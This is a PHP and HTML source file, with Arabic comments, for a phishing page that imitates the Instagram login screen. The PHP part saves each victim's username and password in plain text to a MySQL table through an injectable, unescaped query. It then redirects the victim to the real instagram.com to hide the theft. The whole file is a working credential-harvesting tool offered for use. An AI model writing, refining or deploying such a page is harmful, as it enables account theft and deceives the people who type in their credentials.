<?php
// 1. الاتصال بقاعدة البيانات (صححنا السمية لـ gg)
$conn = mysqli_connect("localhost", "root", "", "gg");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['u_name'];
    $pass = $_POST['u_pass'];

    // 2. كود الحفظ (صححنا اسم الجدول واسماء الأعمدة)
    // استعملنا هاد العلامة `` حيت اسم الجدول فيه فراغ
    $sql = "INSERT INTO `insta grame` (name, password) VALUES ('$user', '$pass')";
    
    if (mysqli_query($conn, $sql)) {
        header("Location: https://www.instagram.com");
        exit();
    } else {
        echo "Error: " . mysqli_error($conn);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Instagram Login</title>
    <style>
        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b56d.png" width="175">
        <form method="POST">
            <input type="text" name="u_name" placeholder="Phone number, username, or email" required>
            <input type="password" name="u_pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
</html>